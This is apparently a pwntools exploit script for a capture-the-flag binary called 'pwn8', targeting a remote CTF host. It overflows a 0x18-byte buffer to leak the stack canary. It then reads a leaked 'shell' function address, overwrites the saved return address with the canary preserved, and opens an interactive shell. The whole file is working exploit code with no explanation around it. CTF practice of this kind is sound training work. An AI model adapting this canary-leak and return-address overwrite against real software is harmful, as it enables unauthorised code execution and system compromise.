from pwn import *
context.log_level='debug'
context_terminal=['gnome-terminal','-x','sh','-c']

p=process('./pwn8')
p=remote("ctf.nefu.edu.cn",33125)
elf=ELF('./pwn8')
if args.G:
	gdb.attach(p)
	pause()


p.recvuntil('name?')
payload=b'a'*0x18
p.sendline(payload)
a=p.recv()
a=p.recv()
print('a:',a)
for i in range(len(a)):
	if a[i]==ord('a') and a[i+1]==ord('\n'):
		flag=i;
		break;
canary=u64(a[i+2:i+9].rjust(8,b'\x00'))
print("canary:",hex(canary))
#a=p.recv()
#print('a:',a)

for i in range(len(a)):
	if a[i]==ord('l') and a[i+1]==ord('?'):
		flag=i;
		break
shell=int(a[i+2:i+16],16)
print('shell:',hex(shell))
pause()
payload=b'a'*0x18+p64(canary)+b'aaaaaaaa'+p64(shell+1)
p.sendline(payload)

p.interactive()

